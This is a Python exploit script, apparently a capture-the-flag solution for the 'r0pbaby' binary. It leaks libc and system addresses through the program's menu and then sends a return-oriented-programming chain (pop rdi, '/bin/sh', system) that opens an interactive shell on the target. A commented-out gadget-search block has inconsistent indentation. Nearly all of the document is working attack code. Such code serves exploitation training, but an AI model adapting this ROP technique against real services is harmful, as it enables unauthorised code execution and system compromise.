from pxwn import *

"""
#================================================
exp = Exploit("segsh",64)
gadget1 = exp.rop("prdi")
gadget2 = exp.rop("prsi")
gadget3 = exp.rop("ppr")
gadget4 = exp.rop("pppr")
gadget5 = exp.rop("ppppr")
gadget6 = exp.rop("/bin/sh")
gadget7 = exp.rop("leave")
#================================================
print "=" * 30
if gadget1 != "Gadgets Not Found!":
    print "pop rdi:" + hex(gadget1)
else:
    print gadget1

print "=" * 30


print "=" * 30

if gadget2 != "Gadgets Not Found!":
    for i in gadget2:
        print "pop rsi: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget2

print "=" * 30

if gadget3 != "Gadgets Not Found!":
    for i in gadget3:
        print "pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget3

print "=" * 30

print "=" * 30
if gadget4 != "Gadgets Not Found!":
    for i in gadget4:
            print "pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget4

print "=" * 30

print "=" * 30
if gadget5 != "Gadgets Not Found!":
    for i in gadget5:
        print "pop pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget5

print "=" * 30
"""
#=========================================================

local=False

if local:
    p = process("./r0pbaby")
    pause()
    p.debug()
else:
    HOST = "localhost"
    PORT = 4444
    p = connect(HOST,PORT)
    pause()
    p.debug()

#=========================================================

p.recvul(":")
p.recvul(":")
p.sendl("1")
p.recvul(":")
fake_base = p.recvl()
libc_base = int(fake_base,16)-0x9ee9b0
p.recvul(":")
p.sendl("2")
p.recvul(":")
p.sendl("system")
p.recvul(":")
fake_sys = p.recvl()
syscall = libc_base+0xf4840
binsh = int(fake_sys,16)+0x13669b
p.recvul(":")
p.sendl("3")
p.recvul(":")


prax = libc_base+0x000f83eb
prdi = libc_base+0x0016498a
prsi = libc_base+0x0012c0fb 
prdx = libc_base+0x00116cd2
system = libc_base+0x000bcee0

print green("System:"),hex(system)
print green("Syscall:"),hex(syscall)
print green("Binsh:"),hex(binsh)
print green("Libc:"),hex(libc_base)

payload = "A"*8 + pk64(prdi)+pk64(binsh)+pk64(system)

p.sendl("32")
p.sendl(payload)
p.recvul(".\n")
p.interactive()


